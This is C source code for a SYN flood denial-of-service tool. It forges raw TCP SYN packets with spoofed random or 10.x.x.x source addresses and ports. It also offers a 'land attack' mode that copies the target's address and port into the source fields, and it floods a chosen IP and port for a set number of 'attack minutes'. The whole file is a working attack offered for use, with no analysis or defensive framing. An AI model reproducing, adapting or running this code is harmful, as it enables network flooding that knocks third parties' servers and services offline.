#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <time.h>
#include <unistd.h>

#define PACKET_SIZE		48
#define SRC_IP 			12
#define DST_IP 			16
#define SEQ_ID			24
#define IP_ID			4
#define IP_TTL_			28
#define SRC_PORT 		20
#define DST_PORT 		22
#define IP_CHECKSUM 	10
#define TCP_CHECKSUM	36
#define IP_START  		0
#define TCP_START 		20

inline unsigned short calculate_checksum (unsigned short *buf, int size);

struct argstru
{
  /* options (no parament) */
  int land;
  int privatesrc;
  int randtype;
  int verbose;

  /* options (have parament) */
  int times;
  long packets;
  short int port;
  char dsthostaddr[4 * 3 + 3];	/* Max length for IPv4 address */
} args;

/* define and init a syn packet */
unsigned char packet[PACKET_SIZE] = {
  0x45, 0x00, 0x00, 0x30, 0x79, 0xd6, 0x40, 0x00, 0x80, 0x06, 0x35, 0x9c,
  0xc0, 0xa8, 0xe5, 0x01,
  0xc0, 0xa8, 0xe5, 0x02, 0x13, 0x55, 0x00, 0x17, 0x08, 0x8d, 0x78, 0x46,
  0x00, 0x00, 0x00, 0x00,
  0x70, 0x02, 0xff, 0xff, 0xa3, 0x8a, 0x00, 0x00, 0x02, 0x04, 0x05, 0xb4,
  0x01, 0x01, 0x04, 0x02
};

int
init_args (struct argstru *p)
{
  p->land = 0;
  p->privatesrc = 0;
  p->randtype = 0;
  p->verbose = 0;


  p->packets=0;
  p->times = 30;
  p->port = 80;
  strcpy (p->dsthostaddr, "");

  return 0;
}


print_args (struct argstru * p)
{
  if (args.verbose == 0 )
  {
	  printf("The target is %s\n", p->dsthostaddr);
	  return 0;
  }
  printf ("land		=%d\n", p->land);
  printf ("privatesrc	=%d\n", p->privatesrc);
  printf ("randtype	=%d\n", p->randtype);

  printf ("times	=%d\n", p->times);
  printf ("port		=%d\n", p->port);


  printf ("\n======================================\n");
  printf ("%d.%d .%d.%d\n", packet[DST_IP], packet[DST_IP + 1],
	  packet[DST_IP + 2], packet[DST_IP + 3]);
  printf ("port is %ld\n", args.port);

  return 0;
}

print_help()
{
	printf("Usage: syn3 [option]  host_ip\n");
	printf("  Option:\n");
	printf("   -r	random for every processer\n");
	printf("   -l   land attack mode\n");
	printf("   -v   verbose mode \n");
	printf("   -f   use private src address of 10.x.x.x\n\n");
	printf("   -n  xxx    max send packets, 0 for continues\n");
	printf("   -t  xxx    attack minutes\n\n");
	printf("Note: target host MUST BE ip address, don't use domain-name\n");
}

int
parse_args (struct argstru *p, int argcount, char *argstring[])
{

  int c;
  int index;
  opterr = 0;

  while ((c = getopt (argcount, argstring, "lvrfn:t:p:")) != -1)
    switch (c)
      {
      case 'l':
	p->land = 1;
	break;
      case 'r':
	p->randtype = 1;
	break;
      case 'f':
	p->privatesrc = 1;
	break;
	  case 'v':
	p->verbose = 1;
    break;

      case 'n':
	p->packets = atol(optarg);
	break;
      case 't':
	p->times = atoi (optarg);
	break;
      case 'p':
	p->port = atoi (optarg);
	break;

      case '?':
	if (optopt == 't' || optopt == 'p')
	  fprintf (stderr, "Option -%c requires an argument.\n", optopt);
	else if (isprint (optopt))
	  fprintf (stderr, "Unknown option `-%c'.\n", optopt);
	else
	  fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
	return 1;
      default:
	abort ();
      }

/*
  for (index = optind; index < argcount; index++)
    printf ("Non-option argument %s\n", argstring[index]);
*/

  strcpy (p->dsthostaddr, argstring[optind]);
  return 0;
}

int
init_packet ()
{
  /* fill some fix item, such as dst server and dst port */
  int i;
  struct iphdr *pip;
  unsigned short int *p;
  pip = (struct iphdr *) packet;
  p = &packet[DST_PORT];
  *p = htons (args.port);

  pip->daddr = inet_addr (args.dsthostaddr);

  if (args.land == 1)
  {
	  packet[SRC_PORT] = packet[DST_PORT];
	  packet[SRC_PORT + 1 ]= packet[DST_PORT+1];

	  for (i=0; i<4  ; i++ )
	  {
		  packet[SRC_IP+i] = packet[DST_IP +i];
	  }
  }

  return 0;
}

inline int
gen_packet ()
{
  /* make difference value every time */
  unsigned long result_checksum = 0;

  int ii = 0;

  // change ip identify
  ii = 0;
  packet[IP_ID + ii++] = rand () % 255;
  packet[IP_ID + ii++] = rand () % 255;


  // change tcp seq id 
  for (ii=0; ii < 4 ; ii++ )
  {
	  packet[SEQ_ID+ii]= rand () %255;
  }

if (args.land == 0)
{
  // change source port
  packet[SRC_PORT] = rand () % 255;
  packet[SRC_PORT + 1] = rand () % 255;

  ii = 0;
  if (args.privatesrc)
    packet[SRC_IP + ii++] = 10;
  else
    packet[SRC_IP + ii++] = rand () % 255;
  packet[SRC_IP + ii++] = rand () % 255;
  packet[SRC_IP + ii++] = rand () % 255;
  packet[SRC_IP + ii++] = rand () % 255;
}


  //计算IP的CHECKSUM
  packet[IP_CHECKSUM] = 0;
  packet[IP_CHECKSUM + 1] = 0;

  result_checksum =
    calculate_checksum ((unsigned short *) &packet[IP_START], 20);

  packet[IP_CHECKSUM] = (unsigned char) (result_checksum & 0x00ff);
  packet[IP_CHECKSUM + 1] = (unsigned char) (result_checksum >> 8);

  //计算TCP的CHECKSUM
  packet[TCP_CHECKSUM] = 0x00;	//将伪头部部分的协议及长度共4个字节放入CHECKSUM中，以方便计算
  packet[TCP_CHECKSUM + 1] = 0x22;	//长度按28个字节来算

  result_checksum =
    calculate_checksum ((unsigned short *) &packet[TCP_START - 8], 36);

  packet[TCP_CHECKSUM] = (unsigned char) (result_checksum & 0x00ff);
  packet[TCP_CHECKSUM + 1] = (unsigned char) (result_checksum >> 8);

  return 0;
}

inline unsigned short
calculate_checksum (unsigned short *buf, int size)
{
  unsigned long checksum = 0;
  unsigned short len;
  len = sizeof (unsigned short);

  for (; size > 1; size -= len)
    {
      checksum += *buf++;
    }

  if (size == 1)
    {
      checksum += *(unsigned char *) buf;
    }

  checksum = (checksum >> 16) + (checksum & 0xffff);
  checksum += (checksum >> 16);

  return (~(unsigned short) checksum);
}

/* =============================================================================== */
int
main (int argc, char *argv[])
{
  int s;			/* socket id */
  int j;			/* temp var */
   
  struct sockaddr_in servaddr;

  unsigned long int packets = 0;
  unsigned long begin_time = 0;
  unsigned long allticks;    /* All ticks for given minites */ 
 
  unsigned long t;

  if (argc ==1 )
	{	  print_help(); return 0; }
    
  init_args (&args);
  if (parse_args (&args, argc, argv))
    {
      printf ("Arguments error! abort!\n");
      return 1;
    }
  print_args (&args);

  init_packet ();

  servaddr.sin_family = AF_INET;
  inet_pton (AF_INET, args.dsthostaddr, &servaddr.sin_addr);
  s = socket (PF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt (s, IPPROTO_IP, IP_HDRINCL, &j, sizeof (int));

  if (args.randtype == 1)
    {
      srand ((int) time (0));
    }

  begin_time = clock ();
  allticks= args.times*60*CLOCKS_PER_SEC+ begin_time ;

  while ( ! ( clock() > allticks || ( args.packets!=0 && packets > args.packets )) ) 
    {
	  gen_packet (); 
	  sendto (s, packet, PACKET_SIZE, 0, (struct sockaddr *) &servaddr, sizeof (servaddr));
	  
	  packets++;
    }
  t= (clock() - begin_time ) / CLOCKS_PER_SEC  ; 
  printf("\npackets are %ld / %ld minutes  avs=%1d pps \n", packets, t/60 , packets / t );
  close (s);
  return 0;
}
